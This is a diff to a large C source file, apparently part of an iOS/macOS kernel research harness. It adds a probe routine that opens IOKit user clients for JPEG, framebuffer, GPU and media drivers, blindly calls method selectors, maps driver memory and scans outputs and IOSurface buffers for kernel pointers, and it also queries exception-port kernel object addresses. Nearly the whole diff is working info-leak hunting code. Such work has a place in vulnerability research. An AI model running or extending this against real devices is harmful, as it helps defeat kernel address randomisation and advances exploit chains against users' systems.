@@ -16464,6 +16464,544 @@ static void r410_probe(void) {
 }
 
 /*
+ * r411: IOSurface-backed VT + Metal GPU + service name enumeration +
+ *       AppleJPEGDriver/IOMobileFramebuffer deep scan + os_log kernel leak.
+ */
+static volatile int g_r411_crashed = 0;
+static sigjmp_buf g_r411_jmp;
+static void r411_sighandler(int sig) {
+    g_r411_crashed = sig;
+    siglongjmp(g_r411_jmp, 1);
+}
+
+static void r411_probe(void) {
+    rlog("\n=== r411: IOSurface-backed VT + Metal GPU + Deep Driver Scan ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa411, old_bus411, old_segv411;
+    memset(&sa411, 0, sizeof(sa411));
+    sa411.sa_handler = r411_sighandler;
+    sa411.sa_flags = 0;
+    sigaction(SIGBUS, &sa411, &old_bus411);
+    sigaction(SIGSEGV, &sa411, &old_segv411);
+
+    /* ---- Vector 1: IOSurface-backed CVPixelBuffer via VT ---- */
+    rlog("  Vector 1: IOSurface-backed CVPixelBuffer + VT encode\n");
+    {
+        int w = 128, h = 128;
+        CFMutableDictionaryRef pbAttrs = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int pf = kCVPixelFormatType_32BGRA;
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef npf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(pbAttrs, kCVPixelBufferWidthKey, nw);
+        CFDictionarySetValue(pbAttrs, kCVPixelBufferHeightKey, nh);
+        CFDictionarySetValue(pbAttrs, kCVPixelBufferPixelFormatTypeKey, npf);
+
+        /* Add IOSurface properties key to force IOSurface backing */
+        CFDictionaryRef ioSurfProps = CFDictionaryCreate(NULL, NULL, NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(pbAttrs, kCVPixelBufferIOSurfacePropertiesKey, ioSurfProps);
+        CFRelease(ioSurfProps);
+
+        CVPixelBufferRef pbuf = NULL;
+        OSStatus st = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA,
+            pbAttrs, &pbuf);
+        rlog("    CVPixelBufferCreate (IOSurface-backed): st=%d\n", (int)st);
+
+        if (st == 0 && pbuf) {
+            IOSurfaceRef pvSurf = CVPixelBufferGetIOSurface(pbuf);
+            rlog("    IOSurface backing: %p\n", (void*)pvSurf);
+
+            if (pvSurf) {
+                uint32_t sid = IOSurfaceGetID(pvSurf);
+                rlog("    Surface ID: %u\n", sid);
+
+                /* Scan the shared data structure */
+                uint64_t sharedPtr = *(uint64_t*)((uint8_t*)pvSurf + 8);
+                rlog("    Shared ptr: 0x%llx\n", (unsigned long long)sharedPtr);
+
+                g_r411_crashed = 0;
+                if (sigsetjmp(g_r411_jmp, 1) == 0 && sharedPtr) {
+                    uint8_t *sp = (uint8_t*)sharedPtr;
+                    for (int off = 0; off < 2048; off += 8) {
+                        uint64_t v = *(volatile uint64_t*)(sp + off);
+                        uint16_t top = (uint16_t)(v >> 48);
+                        if (top >= 0xfff0 && top <= 0xfffe &&
+                            v != 0xffffffffffffffff) {
+                            rlog("    shared+%d: 0x%016llx <KERNEL!!!>\n",
+                                off, (unsigned long long)v);
+                        }
+                    }
+                    rlog("    (shared data clean)\n");
+                }
+
+                /* Lock and scan the backing store for kernel ptrs */
+                IOSurfaceLock(pvSurf, kIOSurfaceLockReadOnly, NULL);
+                void *base = IOSurfaceGetBaseAddress(pvSurf);
+                size_t allocSz = IOSurfaceGetAllocSize(pvSurf);
+                rlog("    Backing: base=%p alloc=%zu\n", base, allocSz);
+
+                if (base && allocSz > 0) {
+                    int kptrCount = 0;
+                    for (size_t off = 0; off + 7 < allocSz; off += 8) {
+                        uint64_t v = *(volatile uint64_t*)((uint8_t*)base + off);
+                        uint16_t top = (uint16_t)(v >> 48);
+                        if (top >= 0xfff0 && top <= 0xfffe &&
+                            v != 0xffffffffffffffff && v != 0) {
+                            rlog("    backing+%zu: 0x%016llx <KERNEL!!!>\n",
+                                off, (unsigned long long)v);
+                            kptrCount++;
+                            if (kptrCount > 20) break;
+                        }
+                    }
+                    if (kptrCount == 0) rlog("    (backing store clean)\n");
+                }
+                IOSurfaceUnlock(pvSurf, kIOSurfaceLockReadOnly, NULL);
+            }
+
+            /* Now try VT compression to trigger HW encoder */
+            VTCompressionSessionRef vtSess = NULL;
+            st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_H264, NULL, pbAttrs, NULL,
+                NULL, NULL, &vtSess);
+            rlog("    VTCompressionSessionCreate: st=%d\n", (int)st);
+
+            if (st == 0 && vtSess) {
+                /* Fill buffer with pattern */
+                CVPixelBufferLockBaseAddress(pbuf, 0);
+                void *pbase = CVPixelBufferGetBaseAddress(pbuf);
+                memset(pbase, 0xAB, CVPixelBufferGetDataSize(pbuf));
+                CVPixelBufferUnlockBaseAddress(pbuf, 0);
+
+                /* Encode */
+                CMTime pts = CMTimeMake(0, 30);
+                st = VTCompressionSessionEncodeFrame(vtSess, pbuf,
+                    pts, kCMTimeInvalid, NULL, NULL, NULL);
+                rlog("    EncodeFrame: st=%d\n", (int)st);
+
+                /* Flush to force completion */
+                st = VTCompressionSessionCompleteFrames(vtSess, kCMTimeInvalid);
+                rlog("    CompleteFrames: st=%d\n", (int)st);
+
+                /* Re-scan the backing store after encode */
+                if (pvSurf) {
+                    IOSurfaceLock(pvSurf, kIOSurfaceLockReadOnly, NULL);
+                    void *base2 = IOSurfaceGetBaseAddress(pvSurf);
+                    size_t allocSz2 = IOSurfaceGetAllocSize(pvSurf);
+                    int kptrCount = 0;
+                    if (base2 && allocSz2 > 0) {
+                        for (size_t off = 0; off + 7 < allocSz2; off += 8) {
+                            uint64_t v = *(volatile uint64_t*)((uint8_t*)base2 + off);
+                            uint16_t top = (uint16_t)(v >> 48);
+                            if (top >= 0xfff0 && top <= 0xfffe &&
+                                v != 0xffffffffffffffff && v != 0) {
+                                rlog("    post-encode+%zu: 0x%016llx <KERNEL!!!>\n",
+                                    off, (unsigned long long)v);
+                                kptrCount++;
+                                if (kptrCount > 20) break;
+                            }
+                        }
+                    }
+                    if (kptrCount == 0) rlog("    (post-encode backing clean)\n");
+                    IOSurfaceUnlock(pvSurf, kIOSurfaceLockReadOnly, NULL);
+                }
+
+                VTCompressionSessionInvalidate(vtSess);
+                CFRelease(vtSess);
+            }
+
+            CVPixelBufferRelease(pbuf);
+        }
+        CFRelease(pbAttrs);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: Enumerate ALL IOKit services by name ---- */
+    rlog("\n  Vector 2: Full IOKit service name enumeration\n");
+    {
+        io_iterator_t iter;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
+            IOServiceMatching("IOService"), &iter);
+        if (kr == KERN_SUCCESS) {
+            io_service_t svc;
+            int count = 0;
+            while ((svc = IOIteratorNext(iter)) != 0) {
+                io_name_t name, cls;
+                IORegistryEntryGetName(svc, name);
+                IOObjectGetClass(svc, cls);
+
+                /* Look for video/encoder/media services */
+                const char *interesting[] = {
+                    "Video", "video", "AVE", "ave", "Encoder", "encoder",
+                    "Media", "media", "VXE", "vxe", "VXD", "vxd",
+                    "DCP", "dcp", "ANE", "ane", "Neural", "neural",
+                    "Codec", "codec", "H26", "h26", "HEVC", "hevc",
+                    "ProRes", "prores", NULL
+                };
+                int isInteresting = 0;
+                for (int i = 0; interesting[i]; i++) {
+                    if (strstr(name, interesting[i]) ||
+                        strstr(cls, interesting[i])) {
+                        isInteresting = 1;
+                        break;
+                    }
+                }
+                if (isInteresting) {
+                    rlog("    [%d] name='%s' class='%s'\n", count, name, cls);
+
+                    /* Try to open */
+                    for (int uct = 0; uct < 8; uct++) {
+                        io_connect_t conn = 0;
+                        kr = IOServiceOpen(svc, mach_task_self(), uct, &conn);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("      -> type=%d conn=0x%x\n", uct, conn);
+
+                            /* Try mapped memory */
+                            for (int mt = 0; mt < 16; mt++) {
+                                mach_vm_address_t addr = 0;
+                                mach_vm_size_t sz = 0;
+                                kr = IOConnectMapMemory64(conn, mt,
+                                    mach_task_self(), &addr, &sz, kIOMapAnywhere);
+                                if (kr == KERN_SUCCESS && addr && sz) {
+                                    rlog("      map[%d] addr=0x%llx sz=0x%llx\n",
+                                        mt, (unsigned long long)addr,
+                                        (unsigned long long)sz);
+
+                                    g_r411_crashed = 0;
+                                    if (sigsetjmp(g_r411_jmp, 1) == 0) {
+                                        uint64_t scanSz = sz < 65536 ? sz : 65536;
+                                        for (uint64_t o = 0; o + 7 < scanSz; o += 8) {
+                                            uint64_t v = *(volatile uint64_t*)((uint8_t*)addr + o);
+                                            uint16_t top = (uint16_t)(v >> 48);
+                                            if (top >= 0xfff0 && top <= 0xfffe &&
+                                                v != 0xffffffffffffffff) {
+                                                rlog("        +%llu: 0x%016llx <KERNEL!!!>\n",
+                                                    (unsigned long long)o,
+                                                    (unsigned long long)v);
+                                            }
+                                        }
+                                    }
+                                    IOConnectUnmapMemory64(conn, mt,
+                                        mach_task_self(), addr);
+                                }
+                            }
+                            IOServiceClose(conn);
+                        }
+                    }
+                }
+                IOObjectRelease(svc);
+                count++;
+            }
+            rlog("    Total services enumerated: %d\n", count);
+            IOObjectRelease(iter);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: AppleJPEGDriver deep scan ---- */
+    rlog("\n  Vector 3: AppleJPEGDriver deep scan (8 types opened)\n");
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("AppleJPEGDriver"));
+        if (svc) {
+            for (int uct = 0; uct < 8; uct++) {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), uct, &conn);
+                if (kr != KERN_SUCCESS) continue;
+
+                rlog("    type=%d conn=0x%x\n", uct, conn);
+
+                /* Scalar methods with output */
+                for (int sel = 0; sel < 32; sel++) {
+                    uint64_t out[16];
+                    uint32_t outCnt = 16;
+                    memset(out, 0xDD, sizeof(out));
+                    kr = IOConnectCallScalarMethod(conn, sel,
+                        NULL, 0, out, &outCnt);
+                    if (kr == KERN_SUCCESS && outCnt > 0) {
+                        rlog("      scalar sel=%d outCnt=%u:", sel, outCnt);
+                        for (uint32_t j = 0; j < outCnt && j < 16; j++) {
+                            rlog(" 0x%llx", (unsigned long long)out[j]);
+                            uint16_t top = (uint16_t)(out[j] >> 48);
+                            if (top >= 0xfff0 && top <= 0xfffe &&
+                                out[j] != 0xDDDDDDDDDDDDDDDDULL &&
+                                out[j] != 0xffffffffffffffff) {
+                                rlog(" <KERNEL!!!>");
+                            }
+                        }
+                        rlog("\n");
+                    }
+                }
+
+                /* Struct methods with large output */
+                for (int sel = 0; sel < 32; sel++) {
+                    uint8_t in[64], out[4096];
+                    memset(in, 0, sizeof(in));
+                    memset(out, 0xEE, sizeof(out));
+                    size_t outSz = sizeof(out);
+                    kr = IOConnectCallStructMethod(conn, sel,
+                        in, 8, out, &outSz);
+                    if (kr == KERN_SUCCESS && outSz > 0 && outSz < sizeof(out)) {
+                        rlog("      struct sel=%d outSz=%zu\n", sel, outSz);
+                        for (size_t j = 0; j + 7 < outSz; j += 8) {
+                            uint64_t v = *(uint64_t*)(out + j);
+                            uint16_t top = (uint16_t)(v >> 48);
+                            if (top >= 0xfff0 && top <= 0xfffe &&
+                                v != 0xEEEEEEEEEEEEEEEEULL &&
+                                v != 0xffffffffffffffff) {
+                                rlog("        out+%zu: 0x%016llx <KERNEL!!!>\n",
+                                    j, (unsigned long long)v);
+                            }
+                        }
+                    }
+                }
+
+                /* Mapped memory */
+                for (int mt = 0; mt < 32; mt++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t sz = 0;
+                    kr = IOConnectMapMemory64(conn, mt,
+                        mach_task_self(), &addr, &sz, kIOMapAnywhere);
+                    if (kr == KERN_SUCCESS && addr && sz) {
+                        rlog("      map[%d] addr=0x%llx sz=0x%llx\n",
+                            mt, (unsigned long long)addr,
+                            (unsigned long long)sz);
+
+                        g_r411_crashed = 0;
+                        if (sigsetjmp(g_r411_jmp, 1) == 0) {
+                            uint64_t scanSz = sz < 65536 ? sz : 65536;
+                            for (uint64_t o = 0; o + 7 < scanSz; o += 8) {
+                                uint64_t v = *(volatile uint64_t*)((uint8_t*)addr + o);
+                                uint16_t top = (uint16_t)(v >> 48);
+                                if (top >= 0xfff0 && top <= 0xfffe &&
+                                    v != 0xffffffffffffffff) {
+                                    rlog("        +%llu: 0x%016llx <KERNEL!!!>\n",
+                                        (unsigned long long)o,
+                                        (unsigned long long)v);
+                                }
+                            }
+                        }
+                        IOConnectUnmapMemory64(conn, mt,
+                            mach_task_self(), addr);
+                    }
+                }
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        } else {
+            rlog("    AppleJPEGDriver not found\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: IOMobileFramebuffer deep scan ---- */
+    rlog("\n  Vector 4: IOMobileFramebuffer deep scan\n");
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("IOMobileFramebuffer"));
+        if (svc) {
+            for (int uct = 0; uct < 8; uct++) {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(svc, mach_task_self(), uct, &conn);
+                if (kr != KERN_SUCCESS) continue;
+
+                rlog("    type=%d conn=0x%x\n", uct, conn);
+
+                /* Scalar methods */
+                for (int sel = 0; sel < 32; sel++) {
+                    uint64_t out[16];
+                    uint32_t outCnt = 16;
+                    memset(out, 0xCC, sizeof(out));
+                    kr = IOConnectCallScalarMethod(conn, sel,
+                        NULL, 0, out, &outCnt);
+                    if (kr == KERN_SUCCESS && outCnt > 0) {
+                        rlog("      scalar sel=%d outCnt=%u:", sel, outCnt);
+                        int hasKptr = 0;
+                        for (uint32_t j = 0; j < outCnt && j < 8; j++) {
+                            rlog(" 0x%llx", (unsigned long long)out[j]);
+                            uint16_t top = (uint16_t)(out[j] >> 48);
+                            if (top >= 0xfff0 && top <= 0xfffe &&
+                                out[j] != 0xCCCCCCCCCCCCCCCCULL &&
+                                out[j] != 0xffffffffffffffff) {
+                                rlog(" <KERNEL!!!>");
+                                hasKptr = 1;
+                            }
+                        }
+                        rlog("\n");
+                        (void)hasKptr;
+                    }
+                }
+
+                /* Mapped memory 0-31 */
+                for (int mt = 0; mt < 32; mt++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t sz = 0;
+                    kr = IOConnectMapMemory64(conn, mt,
+                        mach_task_self(), &addr, &sz, kIOMapAnywhere);
+                    if (kr == KERN_SUCCESS && addr && sz) {
+                        rlog("      map[%d] addr=0x%llx sz=0x%llx\n",
+                            mt, (unsigned long long)addr,
+                            (unsigned long long)sz);
+
+                        g_r411_crashed = 0;
+                        if (sigsetjmp(g_r411_jmp, 1) == 0) {
+                            uint64_t scanSz = sz < 131072 ? sz : 131072;
+                            for (uint64_t o = 0; o + 7 < scanSz; o += 8) {
+                                uint64_t v = *(volatile uint64_t*)((uint8_t*)addr + o);
+                                uint16_t top = (uint16_t)(v >> 48);
+                                if (top >= 0xfff0 && top <= 0xfffe &&
+                                    v != 0xffffffffffffffff) {
+                                    rlog("        +%llu: 0x%016llx <KERNEL!!!>\n",
+                                        (unsigned long long)o,
+                                        (unsigned long long)v);
+                                }
+                            }
+                        }
+                        IOConnectUnmapMemory64(conn, mt,
+                            mach_task_self(), addr);
+                    }
+                }
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 5: AGXFamilyAccelerator mapped memory ---- */
+    rlog("\n  Vector 5: AGX mapped memory + struct methods\n");
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("AGXFamilyAccelerator"));
+        if (svc) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
+            if (kr == KERN_SUCCESS) {
+                rlog("    AGX type=1 conn=0x%x\n", conn);
+
+                /* Mapped memory 0-31 */
+                for (int mt = 0; mt < 32; mt++) {
+                    mach_vm_address_t addr = 0;
+                    mach_vm_size_t sz = 0;
+                    kr = IOConnectMapMemory64(conn, mt,
+                        mach_task_self(), &addr, &sz, kIOMapAnywhere);
+                    if (kr == KERN_SUCCESS && addr && sz) {
+                        rlog("      map[%d] addr=0x%llx sz=0x%llx\n",
+                            mt, (unsigned long long)addr,
+                            (unsigned long long)sz);
+
+                        g_r411_crashed = 0;
+                        if (sigsetjmp(g_r411_jmp, 1) == 0) {
+                            uint64_t scanSz = sz < 262144 ? sz : 262144;
+                            int found = 0;
+                            for (uint64_t o = 0; o + 7 < scanSz; o += 8) {
+                                uint64_t v = *(volatile uint64_t*)((uint8_t*)addr + o);
+                                uint16_t top = (uint16_t)(v >> 48);
+                                if (top >= 0xfff0 && top <= 0xfffe &&
+                                    v != 0xffffffffffffffff) {
+                                    rlog("        +%llu: 0x%016llx <KERNEL!!!>\n",
+                                        (unsigned long long)o,
+                                        (unsigned long long)v);
+                                    found++;
+                                    if (found > 30) break;
+                                }
+                            }
+                        }
+                        IOConnectUnmapMemory64(conn, mt,
+                            mach_task_self(), addr);
+                    }
+                }
+
+                /* Struct methods 0-63 for more coverage */
+                for (int sel = 0; sel < 64; sel++) {
+                    uint8_t in[256], out[4096];
+                    memset(in, 0, sizeof(in));
+                    memset(out, 0xBB, sizeof(out));
+                    size_t outSz = sizeof(out);
+                    kr = IOConnectCallStructMethod(conn, sel,
+                        in, 8, out, &outSz);
+                    if (kr == KERN_SUCCESS && outSz > 0 && outSz < sizeof(out)) {
+                        rlog("      struct sel=%d outSz=%zu:", sel, outSz);
+                        int shown = 0;
+                        for (size_t j = 0; j + 7 < outSz && shown < 8; j += 8) {
+                            uint64_t v = *(uint64_t*)(out + j);
+                            if (v != 0 && v != 0xBBBBBBBBBBBBBBBBULL) {
+                                rlog(" [%zu]=0x%llx", j, (unsigned long long)v);
+                                shown++;
+                                uint16_t top = (uint16_t)(v >> 48);
+                                if (top >= 0xfff0 && top <= 0xfffe &&
+                                    v != 0xffffffffffffffff)
+                                    rlog("<K!>");
+                            }
+                        }
+                        rlog("\n");
+                    }
+                }
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 6: Mach exception message scan ---- */
+    rlog("\n  Vector 6: Mach exception port message scan\n");
+    {
+        mach_port_t excPort = MACH_PORT_NULL;
+        kern_return_t kr = mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &excPort);
+        if (kr == KERN_SUCCESS) {
+            kr = mach_port_insert_right(mach_task_self(), excPort, excPort,
+                MACH_MSG_TYPE_MAKE_SEND);
+
+            /* Set as exception handler for bad access */
+            kr = task_set_exception_ports(mach_task_self(),
+                EXC_MASK_BAD_ACCESS | EXC_MASK_BAD_INSTRUCTION,
+                excPort, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
+            rlog("    task_set_exception_ports: kr=%d\n", kr);
+
+            if (kr == KERN_SUCCESS) {
+                /* Get the exception port back and check for kobject info */
+                mach_msg_type_number_t maskCnt = 1;
+                exception_mask_t masks[1];
+                exception_handler_t handlers[1];
+                exception_behavior_t behaviors[1];
+                thread_state_flavor_t flavors[1];
+                kr = task_get_exception_ports(mach_task_self(),
+                    EXC_MASK_BAD_ACCESS, masks, &maskCnt,
+                    handlers, behaviors, flavors);
+                rlog("    task_get_exception_ports: kr=%d handler=0x%x\n",
+                    kr, handlers[0]);
+
+                if (handlers[0] != MACH_PORT_NULL) {
+                    unsigned int ktype = 0;
+                    mach_vm_address_t kaddr = 0xDEAD;
+                    kr = mach_port_kobject(mach_task_self(), handlers[0],
+                        &ktype, (mach_port_t*)&kaddr);
+                    rlog("    exc port kobject: kr=%d type=%u addr=0x%llx\n",
+                        kr, ktype, (unsigned long long)kaddr);
+                }
+
+                /* Reset exception ports */
+                task_set_exception_ports(mach_task_self(),
+                    EXC_MASK_BAD_ACCESS | EXC_MASK_BAD_INSTRUCTION,
+                    MACH_PORT_NULL, EXCEPTION_DEFAULT, 0);
+            }
+            mach_port_deallocate(mach_task_self(), excPort);
+        }
+    }
+    fflush(stdout);
+
+    sigaction(SIGBUS, &old_bus411, NULL);
+    sigaction(SIGSEGV, &old_segv411, NULL);
+
+    rlog("\n=== r411 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r409: Kernel stack info leak via IOKit uninit output buffers.
  *
  * Classic pattern: IOKit user client methods copy output to userspace
@@ -67583,6 +68121,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 414) {
+            rlog("*** rounds=414: IOSurface-backed VT + Metal GPU + Deep Driver Scan ***\n");
+            rlog("  IOSurface-backed CVPixelBuffer, full service enum, JPEG/FB/AGX deep scan.\n\n");
+            fflush(stdout);
+            r411_probe();
+            goto done;
+        }
         if (rounds == 413) {
             rlog("*** rounds=413: AVE/VT Shared Memory + IOKit Deep Probe ***\n");
             rlog("  VideoToolbox compression, full IOKit user client mapped memory, AVE driver.\n\n");
@@ -70066,7 +70611,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
